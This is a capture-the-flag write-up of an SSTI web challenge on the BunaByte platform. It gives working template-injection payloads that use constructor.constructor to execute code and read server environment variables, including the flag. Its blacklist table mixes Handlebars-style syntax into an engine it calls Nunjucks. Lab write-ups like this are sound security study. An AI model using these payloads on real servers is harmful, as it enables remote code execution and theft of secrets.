---
title: "Recognition Roulette — SSTI"
category: web
platform: BunaByte
difficulty: —
points: 400
solves: 19
flag: "[REDACTED]"
date: 2026-07-23
author: "mr.p4rr0t"
tags:
  - "mr.p4rr0t"
  - "ctf"
  - "web"
  - "bunabyte"
---

# Recognition Roulette — SSTI

> **Author:** mr.p4rr0t • **Tag:** `#mr.p4rr0t`

![Recognition Roulette](../../pics/recognition%20roulette.png)

> BinaryCorp's employee recognition portal is protected by a blacklist filter. Bypass the filter, access the prototype chain, and extract the flag from the server environment.
>
> The house thinks it has the advantage, but you're about to prove them wrong.

**URL:** `https://9cfac8e6b8978e3f6037d9608fed7767.bunabyte.com/api/index`

## Challenge

The portal has a simple form with `employee_name` and `recognition_message` fields that POST to `/api/recognize`. The server renders the HTML with user input directly into the response — confirming server-side template injection (SSTI) in Nunjucks, behind a blacklist that blocks block helpers.

## Reconnaissance

### Confirming SSTI

```
POST /api/recognize
Content-Type: application/json

{"employee_name":"{{7*7}}","recognition_message":"hello"}
```

Response: `"Recognition for 49"` — template injection confirmed in Nunjucks.

### Mapping the Blacklist

Testing various template expressions revealed what's blocked:

| Expression | Result | Status |
|-----------|--------|--------|
| `{{7*7}}` | `49` | Works |
| `{{constructor}}` | `function Object() { ... }` | Works |
| `{{lookup constructor "constructor"}}` | `Internal server error` | Blocked |
| `{{#with "s"}} hello {{/with}}` | `Internal server error` | Blocked |
| `{{#each "a"}} {{this}} {{/each}}` | `Internal server error` | Blocked |
| `{{#if "test"}} yes {{/if}}` | `Internal server error` | Blocked |

The blacklist blocks Nunjucks block helpers (`{% %}` and `{{#...}}`), but allows simple expressions `{{expr}}`.

## Solution — Prototype Chain Bypass

Without block helpers, chain the prototype to reach code execution:

1. `{{constructor}}` → `Object` constructor function
2. `{{constructor.constructor}}` → `Function` constructor
3. `{{constructor.constructor("code")()}}` → Creates + executes anonymous `Function`

### Reading Environment Variables

List all environment variables:

```
{{constructor.constructor("return JSON.stringify(Object.keys(globalThis.process.env))")()}}
```

Found `CTF_FLAG` among the env vars. Extract it:

```
{{constructor.constructor("return globalThis.process.env.CTF_FLAG")()}}
```

**Flag: `[REDACTED]`**

## Flag

```
[REDACTED]
```

## Key Takeaways

- **Vulnerability:** Server-Side Template Injection (SSTI) in Nunjucks.
- **Filter bypass:** block helpers (`{% %}`) were blacklisted, but simple expressions (`{{}}`) were not.
- **Prototype chain:** used `constructor.constructor` to reach the `Function` constructor from the template context.
- **Data exfiltration:** read `globalThis.process.env.CTF_FLAG` via a dynamically created `Function`.
- The same `{{7*7}}` payload stored as literal text on the main platform's profile fields — see [[BunaByte Vulnerability Assessment]] — showing that the filter (or lack of a template engine) is what makes a lab exploitable.
